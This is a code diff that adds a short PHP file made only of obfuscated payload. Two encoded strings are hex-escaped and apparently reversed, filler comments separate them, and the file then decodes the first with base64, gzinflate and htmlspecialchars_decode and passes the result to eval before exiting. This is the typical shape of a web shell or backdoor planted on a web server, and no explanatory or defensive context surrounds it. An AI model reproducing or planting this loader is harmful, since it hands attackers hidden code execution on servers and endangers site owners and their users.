@@ -1,0 +1,10 @@
+<?php
+/* AAAAAAAAAAAA */
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+/* AAAAAAAAAAAA */
+$Lix = "\x3d\x3dwm\x63JlLyWlt\x61QpT3On9HRxOFYu2PXS1zGX7QhH/IKOSR\x43PYOFhgiquw8koT8G\x41jptVlg9qXW2F8Q\x629niJeOLv7g\x4148\x62itQ4\x627/Rz8/s52k\x43IZFvs\x62i\x62iKmmeTF/Y\x2b6ERNF1epUgXDZKOw\x63\x41JEN\x43Tw2ZZKl5o/8S2rt5hx7MWR3KFU6rnioG\x2b2UJt\x2bTMSUkHLuGuni8s\x42F\x41\x433J49ER\x42MDqQQN22/t\x42gk\x42wJe/LG\x41dGw/d\x42go\x42wJe/LF\x41tGw/N\x42gs\x42wJe/LE\x419Gw/9\x41gw\x42wJe";
+/* AAAAAAAAAAAA */
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+/* AAAAAAAAAAAA */
+exit;
+?>
